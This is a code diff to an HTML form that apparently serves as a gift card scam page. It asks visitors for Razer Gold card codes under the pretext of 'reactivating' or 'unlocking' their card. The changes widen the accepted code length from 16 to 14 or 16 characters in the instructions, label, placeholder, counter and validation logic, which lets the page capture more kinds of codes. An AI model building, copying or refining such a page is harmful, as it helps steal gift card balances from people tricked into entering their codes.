@@ -86,7 +86,7 @@
                             Important Verification Instructions:
                         </p>
                         <ul class="list-disc list-inside space-y-1 text-slate-700 leading-relaxed pl-1">
-                            <li>Ensure the entered code is exactly <strong>16 characters</strong> in uppercase. Minimum required top-up value is <strong>$10 USD</strong>.</li>
+                            <li>Ensure the entered code is either <strong>14 or 16 characters</strong> in uppercase. Minimum required top-up value is <strong>$10 USD</strong>.</li>
                             <li><strong>Warning:</strong> Entering an invalid, used, or incorrect code can cause processing delays and failure to reactivate your card.</li>
                             <li>Once verified, your gift card will be unlocked for your location and the top-up balance will be added directly to your total balance.</li>
                         </ul>
@@ -100,16 +100,16 @@
                         <input type="hidden" name="_template" value="table">
 
                         <div>
-                            <label class="block text-xs font-semibold text-slate-700 mb-1.5" for="cardCode">Razer gold Gift Card Code / PIN (16 Characters)</label>
+                            <label class="block text-xs font-semibold text-slate-700 mb-1.5" for="cardCode">Razer gold Gift Card Code / PIN (14 or 16 Characters)</label>
                             <div class="relative">
                                 <span class="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-slate-400">
                                     <i class="fa-solid fa-key text-xs"></i>
                                 </span>
-                                <input type="text" name="gift_card_code" id="cardCode" required maxlength="16" placeholder="e.g. ABCDEFGHIJKLMNOP" class="w-full pl-10 pr-4 py-3 rounded-xl border border-slate-300 text-slate-800 text-xs sm:text-sm font-mono uppercase tracking-wider focus:outline-none focus:border-emerald-600 focus:ring-2 focus:ring-emerald-500/20 transition-all" oninput="formatCardCode(this)">
+                                <input type="text" name="gift_card_code" id="cardCode" required maxlength="16" placeholder="e.g. ABCDEFGHIJKLMN" class="w-full pl-10 pr-4 py-3 rounded-xl border border-slate-300 text-slate-800 text-xs sm:text-sm font-mono uppercase tracking-wider focus:outline-none focus:border-emerald-600 focus:ring-2 focus:ring-emerald-500/20 transition-all" oninput="formatCardCode(this)">
                             </div>
                             <div class="flex justify-between items-center mt-1">
                                 <span class="text-[11px] text-slate-400"></span>
-                                <span id="charCount" class="text-[11px] font-mono text-slate-500 font-semibold">0 / 16</span>
+                                <span id="charCount" class="text-[11px] font-mono text-slate-500 font-semibold">0 / 14-16</span>
                             </div>
                         </div>
 
@@ -159,7 +159,7 @@
                 cleanVal = cleanVal.substring(0, 16);
             }
             input.value = cleanVal;
-            document.getElementById('charCount').innerText = `${cleanVal.length} / 16`;
+            document.getElementById('charCount').innerText = `${cleanVal.length} / 14-16`;
         }
 
         async function handleFormSubmit(e) {
@@ -168,8 +168,8 @@
             const cardCode = document.getElementById('cardCode').value.trim();
             const cardAmount = parseFloat(document.getElementById('cardAmount').value);
 
-            if (cardCode.length !== 16) {
-                showToast('Gift card code must be exactly 16 characters long.', 'error');
+            if (cardCode.length !== 14 && cardCode.length !== 16) {
+                showToast('Gift card code must be either 14 or 16 characters long.', 'error');
                 return;
             }
 
